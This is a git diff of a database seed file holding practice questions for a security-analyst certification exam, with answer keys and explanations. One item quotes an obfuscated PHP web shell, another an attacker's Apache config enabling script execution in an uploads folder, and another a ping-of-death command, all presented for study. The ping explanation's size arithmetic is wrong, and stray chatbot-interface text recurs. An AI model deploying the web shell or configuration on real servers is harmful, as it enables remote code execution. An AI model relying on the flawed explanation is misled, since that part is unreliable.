@@ -4,26 +4,25 @@ db.tests.insertOne({
   "testName": "CySa Practice Test #10 (Ultra Level)",
   "xpPerCorrect": 10,
   "questions": [
-{
-  "id": 1,
-  "question": "You are investigating a compromised Linux web server.  You find a suspicious PHP file that contains the following code:
+    {
+      "id": 1,
+      "question": `You are investigating a compromised Linux web server.  You find a suspicious PHP file that contains the following code:
 
     Code Snippet:
-     `<?php $s = "e"."v"."a"."l"; $s($_REQUEST['c']); ?>`
+     \`<?php $s = "e"."v"."a"."l"; $s($_REQUEST['c']); ?>\`
 
-  What is this code doing, why is it dangerous, and what vulnerability *must* be present for this code to be exploitable?",
- "options": [
-   "This code displays the contents of a file specified in the 'c' parameter; it's dangerous because it allows directory traversal; the vulnerability is improper file access controls.",
- "This code executes arbitrary PHP code provided in the 'c' parameter; it's dangerous because it allows remote code execution (RCE); the vulnerability is a lack of input validation combined with the ability to upload and execute PHP files.",
-   "This code creates a new user account on the system; it's dangerous because it allows privilege escalation; the vulnerability is weak password policies.",
-   "This code encrypts user input; it's not inherently dangerous; there is no vulnerability."
-  ],
-"correctAnswerIndex": 1,
- "explanation":
- "This PHP code is *not* displaying file contents, creating user accounts, or encrypting data. This code snippet is a *highly obfuscated* and *extremely dangerous* web shell. Here's how it works:
-  * `$s = \"e\".\"v\".\"a\".\"l\";`: This line defines a variable `$s` by concatenating the characters 'e', 'v', 'a', and 'l'. This results in `$s` containing the string 'eval'. This is a simple obfuscation technique to avoid detection by basic signature-based security tools that might look for the string 'eval'.
-    * `$_REQUEST['c']`: This retrieves the value of a parameter named 'c' from the HTTP request. This parameter can be passed in the URL query string (e.g., `?c=...`) or in the body of a POST request.
-    *  `$s($_REQUEST['c']);`: This line is equivalent to `eval($_REQUEST['c']);`. The `eval()` function in PHP *executes a string as PHP code*. This means that whatever value is passed in the 'c' parameter will be *executed as PHP code* on the server.
+  What is this code doing, why is it dangerous, and what vulnerability *must* be present for this code to be exploitable?`,
+      "options": [
+        "This code displays the contents of a file specified in the 'c' parameter; it's dangerous because it allows directory traversal; the vulnerability is improper file access controls.",
+        "This code executes arbitrary PHP code provided in the 'c' parameter; it's dangerous because it allows remote code execution (RCE); the vulnerability is a lack of input validation combined with the ability to upload and execute PHP files.",
+        "This code creates a new user account on the system; it's dangerous because it allows privilege escalation; the vulnerability is weak password policies.",
+        "This code encrypts user input; it's not inherently dangerous; there is no vulnerability."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `This PHP code is *not* displaying file contents, creating user accounts, or encrypting data. This code snippet is a *highly obfuscated* and *extremely dangerous* web shell. Here's how it works:
+  * \`$s = "e"."v"."a"."l";\`: This line defines a variable \`$s\` by concatenating the characters 'e', 'v', 'a', and 'l'. This results in \`$s\` containing the string 'eval'. This is a simple obfuscation technique to avoid detection by basic signature-based security tools that might look for the string 'eval'.
+    * \`$_REQUEST['c']\`: This retrieves the value of a parameter named 'c' from the HTTP request. This parameter can be passed in the URL query string (e.g., \`?c=...\`) or in the body of a POST request.
+    *  \`$s($_REQUEST['c']);\`: This line is equivalent to \`eval($_REQUEST['c']);\`. The \`eval()\` function in PHP *executes a string as PHP code*. This means that whatever value is passed in the 'c' parameter will be *executed as PHP code* on the server.
 
   This is a *remote code execution (RCE)* vulnerability. An attacker can send arbitrary PHP code to the server through the 'c' parameter, and the server will execute it. This gives the attacker a high level of control over the server, potentially allowing them to:
       *   Read, write, or delete files.
@@ -34,160 +33,152 @@ db.tests.insertOne({
 
   For this code to be exploitable, *two* critical vulnerabilities *must* be present:
   1.  **File Upload Vulnerability:** The attacker must have been able to upload this PHP file to the web server in the first place. This often happens through vulnerabilities in file upload forms that don't properly validate file types or store uploaded files in insecure locations.
-     2. **Remote Code Execution via Eval and lack of input sanitization**: The ability to control and execute whatever input the attacker gives",
-   "examTip": "The `eval()` function in PHP (and similar functions in other languages) is extremely dangerous when used with unsanitized user input, as it allows for remote code execution."
-},
-{
-    "id": 2,
-    "question": "A security analyst is examining network traffic captured from a compromised workstation. They observe a series of DNS requests to domains that follow a pattern:
+     2. **Remote Code Execution via Eval and lack of input sanitization**: The ability to control and execute whatever input the attacker gives`,
+      "examTip": `The \`eval()\` function in PHP (and similar functions in other languages) is extremely dangerous when used with unsanitized user input, as it allows for remote code execution.`
+    },
+    {
+      "id": 2,
+      "question": `A security analyst is examining network traffic captured from a compromised workstation. They observe a series of DNS requests to domains that follow a pattern:
 
     Example DNS Queries:
-    `  a1b2c3d4e5f6.example.com`
-    `  f7g8h9i0j1k2.example.com`
-  `  l3m4n5o6p7q8.example.com`
-    `... (many more similar requests)`
+    \`  a1b2c3d4e5f6.example.com\`
+    \`  f7g8h9i0j1k2.example.com\`
+  \`  l3m4n5o6p7q8.example.com\`
+    \`... (many more similar requests)\`
 
-    What is the MOST likely explanation for this pattern, and what further steps should the analyst take?",
-     "options": [
-      "These are normal DNS requests for legitimate websites; no further action is needed.",
-      "This is likely evidence of Domain Generation Algorithm (DGA) activity, indicating malware communication; the analyst should identify the process making the requests, analyze the malware, and block communication with the generated domains.",
-     "This indicates a misconfigured DNS server on the network; the DNS server settings should be checked.",
-   "This indicates a user is manually mistyping domain names; the user should be reminded to be more careful."
-     ],
-   "correctAnswerIndex": 1,
-  "explanation":
-     "Legitimate DNS requests typically resolve to known, human-readable domain names, not long, random-looking subdomains. A misconfigured DNS server wouldn't generate this specific pattern. User typos wouldn't create a systematic pattern. The observed pattern – a series of DNS requests to domains with *long, seemingly random subdomains* under a common domain (`example.com` in this case) – is highly indicative of a *Domain Generation Algorithm (DGA)*. DGAs are algorithms used by malware to *periodically generate a large number of domain names* that can be used as rendezvous points with their command and control (C2) servers.
+    What is the MOST likely explanation for this pattern, and what further steps should the analyst take?`,
+      "options": [
+        "These are normal DNS requests for legitimate websites; no further action is needed.",
+        "This is likely evidence of Domain Generation Algorithm (DGA) activity, indicating malware communication; the analyst should identify the process making the requests, analyze the malware, and block communication with the generated domains.",
+        "This indicates a misconfigured DNS server on the network; the DNS server settings should be checked.",
+        "This indicates a user is manually mistyping domain names; the user should be reminded to be more careful."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Legitimate DNS requests typically resolve to known, human-readable domain names, not long, random-looking subdomains. A misconfigured DNS server wouldn't generate this specific pattern. User typos wouldn't create a systematic pattern. The observed pattern – a series of DNS requests to domains with *long, seemingly random subdomains* under a common domain (\`example.com\` in this case) – is highly indicative of a *Domain Generation Algorithm (DGA)*. DGAs are algorithms used by malware to *periodically generate a large number of domain names* that can be used as rendezvous points with their command and control (C2) servers.
   *   **Evasion:** By generating many domains, the malware makes it much harder for security tools to block C2 communication by simply blocking a single domain or IP address. The attacker only needs to register *one* of the generated domains for the malware to connect.
      *   **Resilience:** If one C2 domain is taken down, the malware can switch to another generated domain.
 
      Further steps should include:
   1.  **Identify the Process:** Determine which process on the compromised workstation is making these DNS requests (using network monitoring tools or host-based security tools).
     2.   **Analyze the Malware:** Obtain a sample of the malware (if possible) and analyze it (using static and dynamic analysis techniques) to understand its functionality, communication protocols, and the specific DGA it uses.
- 3.    **Block Communication:** Block communication with the generated domains at the firewall, DNS server, or web proxy. This may involve blocking the entire domain (`example.com` in this case) or using threat intelligence feeds to identify and block known DGA-generated domains. Note: blocking the main domain may not be an option.
+ 3.    **Block Communication:** Block communication with the generated domains at the firewall, DNS server, or web proxy. This may involve blocking the entire domain (\`example.com\` in this case) or using threat intelligence feeds to identify and block known DGA-generated domains. Note: blocking the main domain may not be an option.
      4. **Predict future domains:** You can analyze futher domains, or use open-source and paid tools to do so.
-        4.  **Remediate the Compromise:** Remove the malware from the infected workstation and investigate how the system was compromised to prevent future infections.",
-     "examTip": "Domain Generation Algorithms (DGAs) are used by malware to evade detection and maintain communication with C2 servers; look for patterns of seemingly random subdomains."
-},
-{
-    "id": 3,
-    "question": "You are investigating a potential security incident on a Windows server.  You need to determine which user account was used to create a specific file. Which of the following tools or techniques would provide the MOST direct and reliable information about the file's owner?",
-  "options": [
-  "Task Manager",
-    "The `Get-Acl` cmdlet in PowerShell, or the `icacls` command.",
-  "Resource Monitor",
-    "File Explorer's 'Date Modified' property"
-  ],
- "correctAnswerIndex": 1,
-   "explanation":
-    "Task Manager shows running processes, not file ownership. Resource Monitor focuses on resource usage. The 'Date Modified' property shows when the file's *content* was last changed, not necessarily its owner. The *owner* of a file on a Windows system (using the NTFS file system) is a security principal (a user or group) that has certain default permissions on the file. To determine the file's owner, you can use:
-        *   **PowerShell:** The `Get-Acl` cmdlet retrieves the *Access Control List (ACL)* for a file or object. The ACL contains information about the owner and the permissions granted to different users and groups.  You would use it like this:
-        `Get-Acl -Path C:\path\to\file.ext | Format-List`
-           This will display detailed information, including the `Owner` property.
+        4.  **Remediate the Compromise:** Remove the malware from the infected workstation and investigate how the system was compromised to prevent future infections.`,
+      "examTip": `Domain Generation Algorithms (DGAs) are used by malware to evade detection and maintain communication with C2 servers; look for patterns of seemingly random subdomains.`
+    },
+    {
+      "id": 3,
+      "question": `You are investigating a potential security incident on a Windows server.  You need to determine which user account was used to create a specific file. Which of the following tools or techniques would provide the MOST direct and reliable information about the file's owner?`,
+      "options": [
+        "Task Manager",
+        "The `Get-Acl` cmdlet in PowerShell, or the `icacls` command.",
+        "Resource Monitor",
+        "File Explorer's 'Date Modified' property"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Task Manager shows running processes, not file ownership. Resource Monitor focuses on resource usage. The 'Date Modified' property shows when the file's *content* was last changed, not necessarily its owner. The *owner* of a file on a Windows system (using the NTFS file system) is a security principal (a user or group) that has certain default permissions on the file. To determine the file's owner, you can use:
+        *   **PowerShell:** The \`Get-Acl\` cmdlet retrieves the *Access Control List (ACL)* for a file or object. The ACL contains information about the owner and the permissions granted to different users and groups.  You would use it like this:
+        \`Get-Acl -Path C:\\path\\to\\file.ext | Format-List\`
+           This will display detailed information, including the \`Owner\` property.
 
-     *  **`icacls` command:** This command-line tool can also display and modify file and directory permissions, including the owner. You would use it like this:
-  `icacls C:\path\to\file.ext`
+     *  **\`icacls\` command:** This command-line tool can also display and modify file and directory permissions, including the owner. You would use it like this:
+  \`icacls C:\\path\\to\\file.ext\`
     This will show the owner as part of the output.
 
-  These methods provide the *most direct and reliable* way to determine the file's owner, as they query the security information directly from the file system.",
-  "examTip": "Use `Get-Acl` (PowerShell) or `icacls` (Command Prompt) to determine the owner of a file on Windows."
-},
-{
-  "id": 4,
-    "question": "A web application is vulnerable to 'reflected cross-site scripting (XSS)'. An attacker crafts a malicious URL containing a JavaScript payload and sends it to a victim. When the victim clicks the link, the script executes in their browser. Which of the following BEST describes how the attacker's script is executed in this scenario?",
-   "options": [
-    "The script is stored in the web application's database and executed when any user visits the affected page.",
-     "The script is included in the web server's response to the malicious URL, and the victim's browser executes it because it appears to come from the trusted website.",
- "The script is downloaded from a remote server controlled by the attacker and executed by the victim's browser.",
-    "The script is executed on the attacker's server, and the results are sent to the victim's browser."
-     ],
- "correctAnswerIndex": 1,
- "explanation":
-   "Stored XSS involves the script being saved on the server. Downloading from a remote server is possible with XSS, but not the defining characteristic of *reflected* XSS. The script is executed on the *client-side* (in the browser), not the attacker's server. In a *reflected XSS* attack, the malicious script is *not stored* on the vulnerable web server. Instead, the attacker crafts a malicious URL that includes the script as part of a query parameter or other input. When the victim clicks on this malicious URL, their browser sends the request (including the injected script) to the vulnerable web server. The web server then *reflects* the script back to the victim's browser *as part of the response* (e.g., in an error message, a search results page, or any other part of the page that displays user input without proper sanitization). The victim's browser, trusting the response from the legitimate website, executes the injected script.",
-    "examTip": "Reflected XSS involves a malicious script being included in a URL and then 'reflected' back to the user's browser by the vulnerable web server."
-},
-{
-  "id": 5,
-  "question": "You are analyzing a memory dump from a compromised Windows system using the Volatility framework. You suspect that the system was infected with a rootkit that hid a malicious process. Which Volatility plugin would be MOST effective for detecting hidden processes?",
-   "options": [
-      "pslist",
-     "psscan",
-   "dlllist",
-    "netscan"
-   ],
-    "correctAnswerIndex": 1,
-    "explanation":
-     "`pslist` enumerates processes by traversing the `_EPROCESS` list, a standard Windows data structure. However, rootkits can *unlink* a process from this list, making it invisible to `pslist`. `dlllist` lists loaded DLLs, but doesn't directly detect hidden *processes*. `netscan` finds network connections. The `psscan` plugin in Volatility is specifically designed to *detect hidden and terminated processes*. It works by *scanning the physical memory* for `_EPROCESS` structures (the data structures that represent processes in the Windows kernel), *regardless of whether they are linked in the active process list*. This allows it to find processes that have been unlinked from the list by a rootkit to hide their presence. It searches for telltale patterns that signify a process, even if its been hidden.",
-  "examTip": "Use the `psscan` plugin in Volatility to detect hidden processes in a memory dump."
-},
-{
-    "id": 6,
-  "question": "An attacker is attempting a brute-force attack against a web application's login form. The attacker is using a list of common usernames and passwords. However, after a few attempts, the attacker's IP address is blocked, and they can no longer access the login form. Which of the following security controls MOST likely prevented the attack?",
-    "options": [
-      "Cross-site scripting (XSS) protection",
+  These methods provide the *most direct and reliable* way to determine the file's owner, as they query the security information directly from the file system.`,
+      "examTip": `Use \`Get-Acl\` (PowerShell) or \`icacls\` (Command Prompt) to determine the owner of a file on Windows.`
+    },
+    {
+      "id": 4,
+      "question": `A web application is vulnerable to 'reflected cross-site scripting (XSS)'. An attacker crafts a malicious URL containing a JavaScript payload and sends it to a victim. When the victim clicks the link, the script executes in their browser. Which of the following BEST describes how the attacker's script is executed in this scenario?`,
+      "options": [
+        "The script is stored in the web application's database and executed when any user visits the affected page.",
+        "The script is included in the web server's response to the malicious URL, and the victim's browser executes it because it appears to come from the trusted website.",
+        "The script is downloaded from a remote server controlled by the attacker and executed by the victim's browser.",
+        "The script is executed on the attacker's server, and the results are sent to the victim's browser."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Stored XSS involves the script being saved on the server. Downloading from a remote server is possible with XSS, but not the defining characteristic of *reflected* XSS. The script is executed on the *client-side* (in the browser), not the attacker's server. In a *reflected XSS* attack, the malicious script is *not stored* on the vulnerable web server. Instead, the attacker crafts a malicious URL that includes the script as part of a query parameter or other input. When the victim clicks on this malicious URL, their browser sends the request (including the injected script) to the vulnerable web server. The web server then *reflects* the script back to the victim's browser *as part of the response* (e.g., in an error message, a search results page, or any other part of the page that displays user input without proper sanitization). The victim's browser, trusting the response from the legitimate website, executes the injected script.`,
+      "examTip": `Reflected XSS involves a malicious script being included in a URL and then 'reflected' back to the user's browser by the vulnerable web server.`
+    },
+    {
+      "id": 5,
+      "question": `You are analyzing a memory dump from a compromised Windows system using the Volatility framework. You suspect that the system was infected with a rootkit that hid a malicious process. Which Volatility plugin would be MOST effective for detecting hidden processes?`,
+      "options": [
+        "pslist",
+        "psscan",
+        "dlllist",
+        "netscan"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `\`pslist\` enumerates processes by traversing the \`_EPROCESS\` list, a standard Windows data structure. However, rootkits can *unlink* a process from this list, making it invisible to \`pslist\`. \`dlllist\` lists loaded DLLs, but doesn't directly detect hidden *processes*. \`netscan\` finds network connections. The \`psscan\` plugin in Volatility is specifically designed to *detect hidden and terminated processes*. It works by *scanning the physical memory* for \`_EPROCESS\` structures (the data structures that represent processes in the Windows kernel), *regardless of whether they are linked in the active process list*. This allows it to find processes that have been unlinked from the list by a rootkit to hide their presence. It searches for telltale patterns that signify a process, even if its been hidden.`,
+      "examTip": `Use the \`psscan\` plugin in Volatility to detect hidden processes in a memory dump.`
+    },
+    {
+      "id": 6,
+      "question": `An attacker is attempting a brute-force attack against a web application's login form. The attacker is using a list of common usernames and passwords. However, after a few attempts, the attacker's IP address is blocked, and they can no longer access the login form. Which of the following security controls MOST likely prevented the attack?`,
+      "options": [
+        "Cross-site scripting (XSS) protection",
         "Rate limiting and/or account lockout",
-       "SQL injection prevention",
-   "Content Security Policy (CSP)"
-    ],
- "correctAnswerIndex": 1,
-    "explanation":
-  "XSS protection prevents script injection. SQL injection prevention protects against database attacks. CSP controls resource loading. *Rate limiting* and *account lockouts* are the most likely defenses.
+        "SQL injection prevention",
+        "Content Security Policy (CSP)"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `XSS protection prevents script injection. SQL injection prevention protects against database attacks. CSP controls resource loading. *Rate limiting* and *account lockouts* are the most likely defenses.
     *   **Rate Limiting:** This restricts the number of requests (in this case, login attempts) that can be made from a single IP address or user account within a given time period.
   * **Account Lockout:** This temporarily (or permanently) disables an account after a certain number of failed login attempts.
 
- Both of these controls are designed to thwart brute-force attacks by making it impractical for an attacker to try a large number of username/password combinations. The fact that the attacker's IP address was blocked suggests that rate limiting was in place (or potentially an IP-based blocklist triggered by the repeated attempts).",
-   "examTip": "Rate limiting and account lockouts are effective defenses against brute-force attacks."
-},
-{
- "id": 7,
-    "question": "You are investigating a compromised system and discover a file with a `.pcap` extension. What type of file is this, and which tool would you MOST likely use to analyze its contents?",
-     "options": [
+ Both of these controls are designed to thwart brute-force attacks by making it impractical for an attacker to try a large number of username/password combinations. The fact that the attacker's IP address was blocked suggests that rate limiting was in place (or potentially an IP-based blocklist triggered by the repeated attempts).`,
+      "examTip": `Rate limiting and account lockouts are effective defenses against brute-force attacks.`
+    },
+    {
+      "id": 7,
+      "question": `You are investigating a compromised system and discover a file with a \`.pcap\` extension. What type of file is this, and which tool would you MOST likely use to analyze its contents?`,
+      "options": [
         "A PowerShell script; use a text editor.",
- "A network packet capture; use Wireshark or a similar network protocol analyzer.",
-    "A Windows executable file; use a disassembler.",
-    "A compressed archive file; use a file archiver utility."
-     ],
- "correctAnswerIndex": 1,
-  "explanation":
- "A `.pcap` file is *not* a PowerShell script, an executable, or a compressed archive. A `.pcap` (or `.pcapng`) file is a *network packet capture* file. It contains the raw data of network packets that have been captured from a network interface. To analyze the contents of a `.pcap` file, you would use a *network protocol analyzer* (also known as a packet sniffer), such as *Wireshark*. Wireshark allows you to:
+        "A network packet capture; use Wireshark or a similar network protocol analyzer.",
+        "A Windows executable file; use a disassembler.",
+        "A compressed archive file; use a file archiver utility."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `A \`.pcap\` file is *not* a PowerShell script, an executable, or a compressed archive. A \`.pcap\` (or \`.pcapng\`) file is a *network packet capture* file. It contains the raw data of network packets that have been captured from a network interface. To analyze the contents of a \`.pcap\` file, you would use a *network protocol analyzer* (also known as a packet sniffer), such as *Wireshark*. Wireshark allows you to:
      *   Open and view the captured packets.
        *    Inspect the packet headers and payloads.
        *   Filter the packets based on various criteria (IP addresses, ports, protocols, keywords).
       *  Reconstruct TCP streams and HTTP sessions.
      *   Analyze network protocols.
-     *    Identify suspicious patterns or anomalies.",
- "examTip": "`.pcap` files are network packet captures; use Wireshark to analyze them."
-},
-{
-     "id": 8,
- "question": "Which of the following BEST describes the concept of 'data remanence' in the context of data security?",
- "options": [
-     "The encryption of data to protect it from unauthorized access.",
-      "The residual physical representation of data that remains even after attempts have been made to erase or delete it.",
-    "The process of backing up data to a remote server.",
-      "The technique of hiding a message within another message or file."
-    ],
-   "correctAnswerIndex": 1,
-  "explanation":
-    "Data remanence is not encryption, backup, or steganography. *Data remanence* refers to the *residual data* that remains on a storage medium (hard drive, SSD, USB drive, etc.) *even after* attempts have been made to erase or delete it. Simply deleting a file or formatting a drive often *doesn't actually remove the data*; it just removes the pointers to the data, making it *appear* to be gone. The actual data may still be present on the storage medium and can potentially be recovered using specialized data recovery tools. This is a significant security concern, especially when disposing of old hardware or dealing with sensitive data.",
-  "examTip": "Data remanence is the residual data that remains after deletion attempts; secure data erasure techniques are needed to prevent data recovery."
-},
-{
-    "id": 9,
- "question": "A security analyst notices that a web server is responding with a `200 OK` status code to requests for files that do not exist.  What is the potential security implication of this behavior?",
-  "options":[
-   "There is no security implication; this is normal web server behavior.",
-    "This could allow attackers to enumerate valid files and directories on the server, potentially revealing sensitive information.",
-  "This indicates that the web server is overloaded and cannot handle requests properly.",
- "This indicates that the web server is using an outdated version of HTTP."
-    ],
-  "correctAnswerIndex": 1,
-"explanation":
-"A `200 OK` response for non-existent files is *not* normal behavior. It doesn't necessarily indicate an overloaded server or an outdated HTTP version. The standard HTTP response code for a non-existent file is *404 Not Found*. If the web server responds with `200 OK` for files that don't exist, it could allow attackers to perform *file and directory enumeration*. By systematically requesting different filenames and directory names, the attacker can determine which files and directories exist on the server (those that return a 200 OK) and which do not (those that return a 404 Not Found or other error code). This information can reveal the structure of the web application, potentially exposing sensitive files, configuration files, backup files, or other resources that were not intended to be publicly accessible.",
-"examTip": "Web servers should return a 404 Not Found status code for non-existent files; a 200 OK response can leak information."
-},
-{
- "id": 10,
-  "question": "An attacker compromises a web server and modifies the server's `httpd.conf` file (Apache configuration file) to include the following directive:
+     *    Identify suspicious patterns or anomalies.`,
+      "examTip": `\`.pcap\` files are network packet captures; use Wireshark to analyze them.`
+    },
+    {
+      "id": 8,
+      "question": `Which of the following BEST describes the concept of 'data remanence' in the context of data security?`,
+      "options": [
+        "The encryption of data to protect it from unauthorized access.",
+        "The residual physical representation of data that remains even after attempts have been made to erase or delete it.",
+        "The process of backing up data to a remote server.",
+        "The technique of hiding a message within another message or file."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Data remanence is not encryption, backup, or steganography. *Data remanence* refers to the *residual data* that remains on a storage medium (hard drive, SSD, USB drive, etc.) *even after* attempts have been made to erase or delete it. Simply deleting a file or formatting a drive often *doesn't actually remove the data*; it just removes the pointers to the data, making it *appear* to be gone. The actual data may still be present on the storage medium and can potentially be recovered using specialized data recovery tools. This is a significant security concern, especially when disposing of old hardware or dealing with sensitive data.`,
+      "examTip": `Data remanence is the residual data that remains after deletion attempts; secure data erasure techniques are needed to prevent data recovery.`
+    },
+    {
+      "id": 9,
+      "question": `A security analyst notices that a web server is responding with a \`200 OK\` status code to requests for files that do not exist.  What is the potential security implication of this behavior?`,
+      "options": [
+        "There is no security implication; this is normal web server behavior.",
+        "This could allow attackers to enumerate valid files and directories on the server, potentially revealing sensitive information.",
+        "This indicates that the web server is overloaded and cannot handle requests properly.",
+        "This indicates that the web server is using an outdated version of HTTP."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `A \`200 OK\` response for non-existent files is *not* normal behavior. It doesn't necessarily indicate an overloaded server or an outdated HTTP version. The standard HTTP response code for a non-existent file is *404 Not Found*. If the web server responds with \`200 OK\` for files that don't exist, it could allow attackers to perform *file and directory enumeration*. By systematically requesting different filenames and directory names, the attacker can determine which files and directories exist on the server (those that return a 200 OK) and which do not (those that return a 404 Not Found or other error code). This information can reveal the structure of the web application, potentially exposing sensitive files, configuration files, backup files, or other resources that were not intended to be publicly accessible.`,
+      "examTip": `Web servers should return a 404 Not Found status code for non-existent files; a 200 OK response can leak information.`
+    },
+    {
+      "id": 10,
+      "question": `An attacker compromises a web server and modifies the server's \`httpd.conf\` file (Apache configuration file) to include the following directive:
 Use code with caution.
 JavaScript
 Alias /uploads/ "/var/www/uploads/"
@@ -195,18 +186,17 @@ Alias /uploads/ "/var/www/uploads/"
 Options +ExecCGI
 AddHandler cgi-script .php .pl .py .sh
 </Directory>
-```
+\`\`\`
 
-What is the attacker attempting to achieve with this configuration change?",
-"options":[
-"To prevent users from uploading files to the /uploads/ directory.",
-"To allow the execution of server-side scripts (PHP, Perl, Python, shell scripts) in the /uploads/ directory, potentially enabling remote code execution.",
-"To encrypt all files stored in the /uploads/ directory.",
-"To redirect all requests for the /uploads/ directory to a different website."
-],
-"correctAnswerIndex": 1,
-"explanation":
-"This configuration change does not prevent file uploads, encrypt files, or redirect requests. The attacker is modifying the Apache web server's configuration to enable the execution of server-side scripts in the /var/www/uploads/ directory. Let's break down the directives:
+What is the attacker attempting to achieve with this configuration change?`,
+      "options": [
+        "To prevent users from uploading files to the /uploads/ directory.",
+        "To allow the execution of server-side scripts (PHP, Perl, Python, shell scripts) in the /uploads/ directory, potentially enabling remote code execution.",
+        "To encrypt all files stored in the /uploads/ directory.",
+        "To redirect all requests for the /uploads/ directory to a different website."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `This configuration change does not prevent file uploads, encrypt files, or redirect requests. The attacker is modifying the Apache web server's configuration to enable the execution of server-side scripts in the /var/www/uploads/ directory. Let's break down the directives:
 
 Alias /uploads/ "/var/www/uploads/": This creates an alias, mapping the URL path /uploads/ to the physical directory /var/www/uploads/ on the server. This is a standard configuration and not inherently malicious.
 
@@ -215,21 +205,20 @@ Alias /uploads/ "/var/www/uploads/": This creates an alias, mapping the URL path
 
 AddHandler cgi-script .php .pl .py .sh: This directive tells the web server to treat files with the extensions .php, .pl, .py, and .sh as CGI scripts and execute them.
 
-Normally, a web server would not be configured to execute scripts in an uploads directory. This configuration change allows an attacker to upload a malicious script (e.g., a web shell) with one of the specified extensions to the /uploads/ directory and then execute it by accessing it via a URL (e.g., http://example.com/uploads/malicious.php). This would give the attacker remote code execution (RCE) capabilities on the server, a very serious vulnerability.",
-"examTip": "Allowing script execution in upload directories (especially with Options +ExecCGI and AddHandler) is a major security risk that can lead to RCE."
-},
-{
-"id": 11,
-"question": "You are investigating a compromised Windows system and suspect that malware might be using a technique called 'process hollowing' to hide its presence. What is process hollowing, and how does it evade detection?",
-"options": [
-"Process hollowing is a technique for encrypting a process's memory to prevent analysis; it evades detection by making the process's code unreadable.",
-"Process hollowing is a technique where an attacker creates a legitimate process in a suspended state, replaces its memory with malicious code, and then resumes the process; it evades detection by running malicious code within the context of a trusted process.",
-"Process hollowing is a method for compressing a process's memory footprint to improve system performance; it is not a malicious technique.",
-"Process hollowing is a technique for automatically updating a process to the latest version; it is not a malicious technique."
-],
-"correctAnswerIndex": 1,
-"explanation":
-"Process hollowing is not about encryption, compression, or updates. Process hollowing is a sophisticated malware technique used to evade detection by security tools. Here's how it works:
+Normally, a web server would not be configured to execute scripts in an uploads directory. This configuration change allows an attacker to upload a malicious script (e.g., a web shell) with one of the specified extensions to the /uploads/ directory and then execute it by accessing it via a URL (e.g., http://example.com/uploads/malicious.php). This would give the attacker remote code execution (RCE) capabilities on the server, a very serious vulnerability.`,
+      "examTip": `Allowing script execution in upload directories (especially with Options +ExecCGI and AddHandler) is a major security risk that can lead to RCE.`
+    },
+    {
+      "id": 11,
+      "question": `You are investigating a compromised Windows system and suspect that malware might be using a technique called 'process hollowing' to hide its presence. What is process hollowing, and how does it evade detection?`,
+      "options": [
+        "Process hollowing is a technique for encrypting a process's memory to prevent analysis; it evades detection by making the process's code unreadable.",
+        "Process hollowing is a technique where an attacker creates a legitimate process in a suspended state, replaces its memory with malicious code, and then resumes the process; it evades detection by running malicious code within the context of a trusted process.",
+        "Process hollowing is a method for compressing a process's memory footprint to improve system performance; it is not a malicious technique.",
+        "Process hollowing is a technique for automatically updating a process to the latest version; it is not a malicious technique."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Process hollowing is not about encryption, compression, or updates. Process hollowing is a sophisticated malware technique used to evade detection by security tools. Here's how it works:
 
 Create Legitimate Process (Suspended): The attacker creates a legitimate Windows process (e.g., svchost.exe, explorer.exe) in a suspended state. This means the process is created but its code doesn't start executing yet.
 
@@ -248,27 +237,27 @@ The result is that the legitimate process now executes the attacker's malicious 
 Standard security tools that only look at process names and file paths might not detect the malicious code.
 * The malicious code runs with the privileges of the legitimate process.
 
-Detecting process hollowing requires advanced techniques like memory analysis, behavioral analysis, and specialized security tools that can identify inconsistencies in process memory.",
+Detecting process hollowing requires advanced techniques like memory analysis, behavioral analysis, and specialized security tools that can identify inconsistencies in process memory.
 Use code with caution.
-"examTip": "Process hollowing is a sophisticated technique where malware runs its code within the memory space of a legitimate process, evading detection."
-},
-{
-"id": 12,
-"question": "A security analyst observes the following command being executed on a compromised system:
+`,
+      "examTip": `Process hollowing is a sophisticated technique where malware runs its code within the memory space of a legitimate process, evading detection.`
+    },
+    {
+      "id": 12,
+      "question": `A security analyst observes the following command being executed on a compromised system:
 
 Command:
 ping -c 1 -s 65507 192.168.1.1
 
-What is potentially malicious about this command, and what type of attack might it be part of?",
-"options": [
-"The command is performing a normal ping and is not malicious.",
-"The command is attempting a 'ping of death' attack, which can cause a denial-of-service (DoS) condition on vulnerable systems.",
-"The command is checking network connectivity; it is not inherently malicious.",
-"The command is configuring the network interface; it is not inherently malicious."
-],
-"correctAnswerIndex": 1,
-"explanation":
-"While ping is a normal network utility, the specific parameters used here are suspicious. The command is not simply checking connectivity or configuring the network. Let's break down the command:
+What is potentially malicious about this command, and what type of attack might it be part of?`,
+      "options": [
+        "The command is performing a normal ping and is not malicious.",
+        "The command is attempting a 'ping of death' attack, which can cause a denial-of-service (DoS) condition on vulnerable systems.",
+        "The command is checking network connectivity; it is not inherently malicious.",
+        "The command is configuring the network interface; it is not inherently malicious."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `While ping is a normal network utility, the specific parameters used here are suspicious. The command is not simply checking connectivity or configuring the network. Let's break down the command:
 * ping: The standard ping utility, used to send ICMP Echo Request packets to a target host.
 * -c 1: Send only one ping request.
 * -s 65507: This is the critical part. It specifies the size of the ICMP packet payload to be 65507 bytes. The maximum size of an IP packet (including headers) is 65,535 bytes. A ping payload of 65507 bytes, plus the ICMP and IP headers, exceeds this limit.
@@ -277,22 +266,22 @@ What is potentially malicious about this command, and what type of attack might 
 
 This command is attempting a ping of death attack. This is a type of denial-of-service (DoS) attack where the attacker sends a malformed or oversized ping packet to a target system. Vulnerable systems might crash, freeze, or reboot when processing such a packet.
 
-Modern systems are generally patched against the classic ping of death vulnerability, but this command could still be used as part of a reconnaissance effort to identify potentially vulnerable systems or to test for other, related ICMP-based vulnerabilities.",
+Modern systems are generally patched against the classic ping of death vulnerability, but this command could still be used as part of a reconnaissance effort to identify potentially vulnerable systems or to test for other, related ICMP-based vulnerabilities.
 Use code with caution.
-"examTip": "Ping commands with excessively large packet sizes (-s option) can indicate a ping of death attack or reconnaissance."
